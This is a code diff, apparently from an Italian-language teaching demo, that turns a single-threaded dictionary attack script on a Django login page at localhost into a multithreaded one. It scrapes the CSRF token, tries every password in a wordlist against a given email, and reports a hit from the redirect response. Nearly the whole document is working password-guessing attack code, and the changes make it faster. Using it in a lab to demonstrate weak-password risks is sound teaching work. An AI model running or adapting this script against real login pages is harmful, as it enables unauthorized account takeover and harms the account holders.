@@ -3,7 +3,8 @@ import time
 import sys
 import requests
 from bs4 import BeautifulSoup
-
+from concurrent.futures import ThreadPoolExecutor
+import threading
 
 TARGET = "http://localhost:8000"
 LOGIN_URL = TARGET + "/login/"
@@ -13,24 +14,36 @@ EMAIL = input("Email account di test: ")
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 DIZIONARIO_PATH = os.path.join(BASE_DIR, "dizionario.txt")
 
-def get_csrf_token(session):
+lock = threading.Lock()
+stop_event = threading.Event()
+session = requests.Session()
+
+# Recupero token CSRF una sola volta
+def get_csrf_token():
     try:
         r = session.get(LOGIN_URL, timeout=10)
     except requests.exceptions.RequestException:
         print("Errore: impossibile collegarsi al sito.")
-        print("Controlla di aver avviato Django con: python manage.py runserver")
         sys.exit(1)
 
     soup = BeautifulSoup(r.text, "html.parser")
     token = soup.find("input", {"name": "csrfmiddlewaretoken"})
+    if not token:
+        print("Errore: token CSRF non trovato.")
+        sys.exit(1)
+    return token["value"]
 
-    if token:
-        return token["value"]
+csrf_token = get_csrf_token()
 
-    return None
+tentativi = 0
+found = None
 
+# Funzione per provare una password
+def try_password(password):
+    global tentativi, found
+    if stop_event.is_set():
+        return
 
-def try_password(session, csrf_token, password):
     data = {
         "email": EMAIL,
         "password": password,
@@ -38,69 +51,53 @@ def try_password(session, csrf_token, password):
     }
 
     try:
-        r = session.post(LOGIN_URL, data=data, allow_redirects=True, timeout=10)
+        r = session.post(LOGIN_URL, data=data, allow_redirects=False, timeout=10)
     except requests.exceptions.RequestException:
-        print("Errore durante l'invio della richiesta di login.")
-        return False
+        return
 
-    if "/login" not in r.url:
-        return True
+    with lock:
+        tentativi += 1  # incremento solo qui
 
-    return False
+    time.sleep(0.02)  # pausa minima per non sovraccaricare Django
 
+    if r.status_code == 302:
+        with lock:
+            if not found:
+                found = password
+                stop_event.set()
 
+# Controllo dizionario
 if not os.path.exists(DIZIONARIO_PATH):
-    print("--------------------------------")
-    print("ERRORE: file dizionario non trovato.")
-    print("Python sta cercando il file qui:")
-    print(DIZIONARIO_PATH)
-    print("--------------------------------")
-    print("Controlla che nella cartella demo_attacco ci sia davvero un file chiamato:")
-    print("dizionario.txt")
+    print(f"File dizionario non trovato: {DIZIONARIO_PATH}")
     sys.exit(1)
 
+# Leggo tutte le password
+with open(DIZIONARIO_PATH, "r", encoding="utf-8-sig", errors="ignore") as f:
+    passwords = [line.strip() for line in f if line.strip()]
 
-start = time.time()
-
-session = requests.Session()
-csrf_token = get_csrf_token(session)
-
-if not csrf_token:
-    print("Errore durante il recupero del token CSRF.")
-    print("Controlla che la pagina /login/ contenga il form con {% csrf_token %}.")
-    sys.exit(1)
-
-print(f"Token CSRF recuperato: {csrf_token}")
 print("Avvio attacco a dizionario...")
 print(f"File dizionario usato: {DIZIONARIO_PATH}")
 print("--------------------------------")
 
-tentativi = 0
+start = time.time()
 
-with open(DIZIONARIO_PATH, "r", encoding="utf-8", errors="ignore") as file:
-    for riga in file:
-        password = riga.strip()
+# ThreadPoolExecutor con 3 thread
+with ThreadPoolExecutor(max_workers=3) as executor:
+    executor.map(try_password, passwords)
 
-        if not password:
-            continue
+end = time.time()
+total = end - start
 
-        tentativi += 1
-
-        print(f"Tentativo {tentativi}: provo '{password}'")
-
-        if try_password(session, csrf_token, password):
-            end = time.time()
-            total = end - start
-
-            print("--------------------------------")
-            print("ATTACCO RIUSCITO")
-            print(f"Email: {EMAIL}")
-            print(f"Password trovata: {password}")
-            print(f"Tentativi effettuati: {tentativi}")
-            print(f"Tempo totale: {total:.2f} secondi")
-            sys.exit(0)
-
-print("--------------------------------")
-print("ATTACCO FALLITO")
-print("Password non trovata nel dizionario oppure account inesistente.")
-sys.exit(1)
+# Stampa solo il risultato finale
+if found:
+    print("--------------------------------")
+    print("ATTACCO RIUSCITO")
+    print(f"Email: {EMAIL}")
+    print(f"Password trovata: {found}")
+    print(f"Tentativi effettuati: {tentativi}")
+    print(f"Tempo totale: {total:.2f} secondi")
+else:
+    print("--------------------------------")
+    print("ATTACCO FALLITO")
+    print(f"Tentativi effettuati: {tentativi}")
+    print("Password non trovata nel dizionario oppure account inesistente.")
